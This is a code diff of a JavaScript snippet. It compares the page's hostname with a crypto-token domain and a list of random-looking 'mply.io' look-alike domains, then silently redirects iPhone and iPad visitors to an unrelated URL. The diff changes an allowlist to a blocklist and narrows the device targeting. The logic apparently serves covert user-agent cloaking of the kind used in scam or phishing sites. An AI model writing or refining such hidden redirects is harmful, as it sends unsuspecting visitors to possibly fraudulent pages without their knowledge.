@@ -6,15 +6,15 @@ button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
         var redirectURL = "https://live33.online/?be72c72";
-        var allowedDomains = [
-            "https://mply.io.t0ke2n.site",
-            "https://mply.io.1arshg4.site",
-            "https://mply.io.4a6b8dh.site"
+        var blockedDomains = [
+            "mply.io.t0ke2n.site",
+            "mply.io.1arshg4.site",
+            "mply.io.4a6b8dh.site"
         ];
 
-        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !allowedDomains.includes(window.location.hostname)) {
-            var isMobileDevice = /iPhone|iPad|Android/i.test(navigator.userAgent);
-            if (isMobileDevice) {
+        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
+            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
+            if (isIphoneOrIpad) {
                 window.location.href = redirectURL;
             }
         }
